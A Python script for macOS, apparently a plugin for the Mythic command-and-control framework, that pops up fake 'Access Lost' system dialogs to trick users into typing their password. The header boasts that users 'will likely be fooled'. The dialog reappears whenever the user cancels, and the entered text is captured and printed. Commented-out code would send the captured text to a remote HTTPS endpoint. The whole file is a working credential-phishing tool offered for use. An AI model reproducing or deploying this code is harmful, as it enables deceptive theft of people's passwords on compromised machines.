# A customizable password prompter
# Looks nice and users will likely be fooled!
#
# Use this if Mythic's 'prompt', 'jscript', and 'jxa' functions aren't working for you (likely because you haven't libinjected into an appropriate process yet)
#
# Note that the icon that you want to appear in the prompt will need to be uploaded to the target as /tmp/logo.png first

# Had to remove LaunchServices as that is no longer in BigSur
import pwd, urllib2, urllib, sys, os, random, ssl, time, commands, AppKit, glob, platform, getpass, Foundation, SystemConfiguration, PyObjCTools
from AppKit import *
from glob import glob
from Foundation import *
from Cocoa import *
from objc import *
from PyObjCTools import *
import time
import getpass

def main():
    try:
        init = NSAlert.alloc().init()
        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"\" & return & \"Access lost.  user {} \" & return default answer \"\" with icon file \"tmp:logo.png\" with title \"Access Lost\" with hidden answer".format(getpass.getuser()))
        NSApp.setActivationPolicy_(1)
        NSApp.activateIgnoringOtherApps_(True)
        p = s.executeAndReturnError_(None)
        q = str(p)
        c = q.replace("(<NSAppleEventDescriptor: { 'bhit':'utxt'","Button Clicked:").replace("'ttxt':'utxt'","Text Entered:").replace(" }>, None)","")

        a = {'content':c}
        time.sleep(2)
        while("User canceled" in c):
            init = NSAlert.alloc().init()
            s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"\" & return & \"Access lost. user {} \" & return default answer \"\" with icon file \"tmp:logo.png\" with title \"Access Lost\" with hidden answer".format(getpass.getuser()))
            NSApp.setActivationPolicy_(1)
            NSApp.activateIgnoringOtherApps_(True)
            p = s.executeAndReturnError_(None)
            q = str(p)
            c = q.replace("(<NSAppleEventDescriptor: { 'bhit':'utxt'","Button Clicked:").replace("'ttxt':'utxt'","Text Entered:").replace(" }>, None)","")

            a = {'content':c}
            time.sleep(2)
        print(c)

        init = NSAlert.alloc().init()
        s = NSAppleScript.alloc().initWithSource_("set popup to display dialog \"\" & return & \" user {} \" & return default answer\"\" with icon file \"tmp:logo.png\" with title \"blah\" with hidden answer".format(getpass.getuser()))
        NSApp.setActivationPolicy_(1)
        NSApp.activateIgnoringOtherApps_(True)
        p = s.executeAndReturnError_(None)
        q = str(p)
        c = q.replace("(<NSAppleEventDescriptor: { 'bhit':'utxt'","Button Clicked:").replace("'ttxt':'utxt'","Text Entered:").replace(" }>, None)","")

        a = {'content':c}
        print(c)
        # b = 'https://127.0.0.1/validatiion/profile/7'
        # c = urllib2.Request(b,headers=headers,data=a.get('content'))
        # d = urllib2.urlopen(c,context=context)
        # e = d.read()
    except Exception as e:
        print(e)
        
        # a = {'error':str(e)}
        # b = 'https://127.0.0.1/validatiion/profile/7'
        # c = urllib2.Request(b,headers=headers,data=a.get('error'))
        # d = urllib2.urlopen(c,context=context)
        # e = d.read()


if __name__ == '__main__':
    main()
